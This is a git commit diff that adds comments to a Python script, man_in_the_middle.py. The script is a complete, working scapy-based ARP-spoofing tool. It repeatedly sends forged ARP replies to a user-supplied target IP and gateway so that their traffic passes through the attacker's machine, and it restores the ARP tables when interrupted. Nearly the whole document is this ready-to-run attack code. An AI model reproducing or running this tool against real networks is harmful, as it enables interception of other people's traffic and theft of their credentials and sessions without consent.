e3fd49f00110d8c9c3d914b0ba3b68ce5182a657
Sshuja09 <64364598+Sshuja09@users.noreply.github.com>
2024-01-08 21:46:15 +0300

    Added comments

--- man_in_the_middle.py
+++ man_in_the_middle.py
@@ -2,47 +2,46 @@
 import scapy.all as scapy
 import time
 
-
-# This will get the MAC address of the given IP
+# Function to get the MAC address of a given IP
 def get_mac(ip):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_broadcast = broadcast/arp_req
     answer_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
     return answer_list[0][1].hwsrc
-# mac = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc
-# return mac 
-# First 0 = answer list, Second 0 = The first element in the list, 1 = The response part
-# [0] -> [<[ans]>, [unans]] / [0] -> ans = [<[req, res]>, [req, res], [req, res]] / [1] -> [req, <res>]
 
-
-# This will spoof the IP tables of 2 devices resulting in you ending up in the middle of the connection.
+# Function to spoof ARP tables of the target and sender
 def spoof(target_ip, sender_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip)
     scapy.send(packet, verbose=False)
 
-
-# This will restore the IP tables of the targeted devices to the way they were before
+# Function to restore ARP tables to their original state
 def restore(target_ip, sender_ip):
     target_mac = get_mac(target_ip)
     sender_mac = get_mac(sender_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
-    scapy.send(packet, count= 4, verbose=False)
+    scapy.send(packet, count=4, verbose=False)
 
-
+# Input target IP and sender IP from the user
 target_ip = input("Enter the target IP: ")
 sender_ip = input("Enter the gateway IP: ")
+
 try:
     count = 2
     while True:
+        # Spoof ARP tables for target and sender
         spoof(target_ip, sender_ip)
         spoof(sender_ip, target_ip)
-        print(f"\rPackets send: {count}", end="")
+        
+        # Display the number of packets sent
+        print(f"\rPackets sent: {count}", end="")
+        
         count += 2
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\nSending packets to restore the IP tables")
+    # Restore ARP tables on keyboard interrupt
+    print("\nSending packets to restore the ARP tables")
     restore(target_ip, sender_ip)
     restore(sender_ip, target_ip)
-    print("IP tables were restored successfully")
+    print("ARP tables were restored successfully")
